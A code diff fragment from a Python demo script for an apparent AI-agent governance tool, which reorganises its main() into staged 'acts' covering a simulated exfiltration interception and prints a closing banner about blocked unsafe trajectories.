+    print(c("Governance executed before runtime.".center(WIDTH),
+            "bold,bright_cyan"))
+    print(c("Unsafe trajectories never reached execution.".center(WIDTH),
+            "bold,bright_cyan"))
+    print()
+    print(c(HBOLD * WIDTH, "bright_blue"))
+    print()
+    print(c("  Next:  morrison_governance/DEPLOYMENT.md", "dim"))
     print(c("         (LangChain, OpenAI, AutoGen, Claude, MCP, "
             "browser, shell)", "dim"))
     print()
@@ -548,14 +654,16 @@ def final_dashboard(replay_ok: bool) -> None:
 
 # ───────────────────────────── main ──────────────────────────
 def main() -> None:
-    opening()
-    architecture()
-    scene_exfiltration()
-    scene_safe_permitted()
-    scene_layer_tour()
-    scene_adversarial()
-    replay_ok = scene_determinism()
-    final_dashboard(replay_ok)
+    mission_briefing()                            # ACT I
+    gov, plan = _exfil_setup()
+    threat_detected(plan)                         # ACT II
+    trajectory_analysis(gov, plan)                # ACT III
+    interception(gov, plan)                       # ACT IV
+    safe_path_comparison()                        # ACT V
+    attribution()                                 # ACT VI
+    stability_validation()                        # ACT VII
+    replay_ok = forensic_replay()                 # ACT VIII
+    executive_summary(replay_ok)                  # ACT IX
     sys.exit(0 if replay_ok else 1)
 
 
